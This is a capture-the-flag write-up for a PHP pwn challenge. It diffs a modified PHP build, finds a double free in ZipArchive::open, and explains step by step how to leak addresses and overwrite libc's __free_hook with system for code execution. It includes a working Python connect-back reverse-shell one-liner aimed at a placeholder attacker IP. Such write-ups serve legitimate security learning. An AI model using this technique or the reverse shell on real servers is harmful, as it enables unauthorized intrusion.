## MoP - pwn problem - 224 points (17 solves)

### Description

We are given a PHP interpreter, along with the ability to run arbitrary PHP by sending a POST with a parameter `rce` which would be `eval`d. All interesting (aka useful) functions are disabled (eg: `shell_exec`, `popen`, etc.) using a properly blacklisted `disable_functions` in `disable.ini`. We _are_ given a `Dockerfile` to run a copy of the remote service, so that is nice!

There is a `flag` file, as well as a `readflag` file, which means we need to go from PHP-RCE to actual machine-code-RCE, and then run `/readflag`.

### The bug

Strangely, they haven't given a diff of the php source, so we are first not sure if it is a 0-day or a 1-day that we need, or whether there is a bug introduced in the source by the organizers.

Official php source can be [found](https://github.com/php/php-src/) so we try to diff against `master` but that doesn't help, since too many files have changed. Looking at `NEWS`, we know that it is a relatively recent version of PHP. Lots of files are the same though, so we assume that is just a recent version with some changes made to it. To find this, we can find the hashes of the files as git objects and then crawl through the repo to find the correct commit hash. Thankfully someone has written a nice tool to do this -- [gitxref](https://github.com/ali1234/gitxref).

With this, we find that the version they've built off of is `php-7.0.13RC1-31488-g37a8408e83` (git commit `37a8408e83`). There seem to be 4 files that are changed / added:
```
HEAD detached at 37a8408e83
Changes not staged for commit:
    modified:   ext/zip/php_zip.c
    modified:   main/php_version.h
Untracked files:
    ext/standard/tttt.py
    sapi/.DS_Store
```

Diff:
```
--- a/ext/zip/php_zip.c
+++ b/ext/zip/php_zip.c
@@ -1380,7 +1380,6 @@ static ZIPARCHIVE_METHOD(open)
        }
        if (ze_obj->filename) {
                efree(ze_obj->filename);
-               ze_obj->filename = NULL;
        }

        intern = zip_open(resolved_path, flags, &err);
diff --git a/main/php_version.h b/main/php_version.h
index 24765617cb..66c0402e74 100644
--- a/main/php_version.h
+++ b/main/php_version.h
...
-#define PHP_VERSION "8.0.0-dev"
+#define PHP_VERSION "114514-realworld"
```

No idea what the `114514` in the version means. The DS_store is just a mac thing, but the `tttt.py` seems to be a remnant from a different CTF challenge?! (https://www.tuicool.com/articles/RNBJ7fE -- pythonginx). No idea why that file is there.

Anyways, we now know that the bug is a missing `ze_obj->filename = NULL`, which means that we either have UAF or double-free.

### Analysis

Now we know that it doesn't set `filename` to `NULL` for the freed filename pointer in `ZipArchive` object. This leads to multiple frees as in ZipArchive `open` function.

Reading the source, we realize that we can trigger this if there is a `filename` pointer already set, in which case we can repeatedly free it, as long as we cause the write to `filename` (happens after this) to fail. This can be done by causing the opening to fail (example using `ZipArchive::EXCL`).

We will use this ability to perform multiple frees to get code execution.

BTW, this exploit requires understanding and exploiting PHP's custom memory allocator -- the zend allocator.

### Exploit

 1. Create multiple ZipArchive objects which will be used later in the exploit  - we create 3 (for leaking and writing)
 2. Make a new ZipArchive (say `A`), add file and close it
 3. Repeat step2 - say ZipArchive `B`
 4. Open `B` and `A` again
 5. Call `open` on ZipArchive `A` again trying to open the same opened file in EXCLUSIVE mode (using `ZipArchive::EXCL`, this causes `zip_open` to fail) -> `ze_obj->filename` gets freed here followed by freeing of resolved path
 6. Repeat step 5. In open, `resolved_path` points to the same address pointed by `ze_obj->filename`. However since `ze_obj->filename` isn't NULL, we will free it (first free), but as `zip_open` with EXCLUSIVE flag will fail, we will also free `resolved_path` leading to second free of the `ze_obj->filename`. At this point, zend allocator will have first free chunk (of size freed earlier) pointing to the address pointed `ze_obj->filename`, and the next pointer of that freed chunk points to itself.
 7. Close ZipArchive `B` and reopen it again (resolved_path now points to `ze_obj->filename` of the ZipArchive `A`).
 8. However since we overwrite the memory with our address, we repeat Step 5. (open `A` in EXCLUSIVE mode again to free the filename pointer)
 9. We get zend heap memory leak by printing filename of ZipArchive `B` - leak is the address pointed by filename pointer (due to double free) which is usually at constant offset from the start of `zend_mm_heap`
 10. Allocate another chunk of similar size to overwrite the next pointer to the double free'd object - we overwrite and set next pointer value to the `filename` member (offset 0x18 from start of struct) in ZipArchive object of `B` (again at constant offset) -- we use `addfromstring` on the clean ZipArchive objects made in Step 1.
 11. Allocate again to overwrite the `filename` pointer to point to `prop_handler` (offset of 0x10 from struct start)
 12. Allocate again to restore the next pointer of `ze_obj->filename` to again point to itself.
 13. Get filename again, to leak libphp address.
 14. Allocate to restore the heap (so that we can keep using with crashing).
 15. Repeat step 2-13, however this time for step 10, we give address in libphp which has libc pointer to leak libc.
 16. Allocate to overwrite next free chunk pointer to `__free_hook`. (yes, this is libc's free hook ; standard libc free does happen even in zend allocator)
 17. Allocate to overwrite `__free_hook` with `system`.
 18. Call open on one of the ZipArchive made in step 1 with name as the command to send as argument to system.
 19. Get remote shell.

Since we are getting this from the POST to the website, we decide to get the remote shell as a connect-back reverse shell. We do this by running a `python3` command that connects to us.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<<<IPADDRESSTOCONNECT>>>>", 9999));f=os.dup2;f(s.fileno(),0);f(s.fileno(),1);f(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The entire exploit code for this is in [x.php](./x.php). Some of the offsets depended on a bunch of factors like how you were running the code (for example, `php x.php`, or via `php -a`, or via `eval` by sending it via the POST to apache -- this runs PHP as a library, rather than a process). To combat this, we wrote a jank brute force script for the offsets, and ran the bruteforcer locally for a few minutes against the local version of the docker container that the organizers had helpfully provided. This helped a _lot_ in debugging, and also getting the offsets right.

Unfortunately, we are not yet done. We need one more step to get the flag.

### Readflag Troubles

Running `/readflag`, we get a challenge-response style program where we need to prove we can write to it, and then it will give the flag:

```
# /readflag
Solve the easy challenge first
(((((570895)+(-670556))+(871129))-(-626997))-(746247))
input your answer: Alarm clock
```

Unfortunately, notice the `Alarm clock` at the end? That is a `SIGALRM` event. Analyzing the binary, we see that it sets up the challenge, and places a 1 millisecond alarm on itself, which causes it to die immediately.

Trying to run this via a python script that can read the challenge, compute the answer and reply back didn't work fast enough. So we wrote a solver in C that would do it for us. Unfortunately, even that wasn't fast enough, due to buffering issues, so we then converted it into a solver written in C using only pure syscalls for IO (no `FILE*` etc), and that worked fast enough. See the source for that in [solve_readflag.c](./solve_readflag.c). We simply hosted this compiled binary on a server of ours, downloaded it to `/tmp` and ran it to get the flag.


### Flag

`rwctf{+++just_a_check_in_flag_have_a_good_time+++:)}`
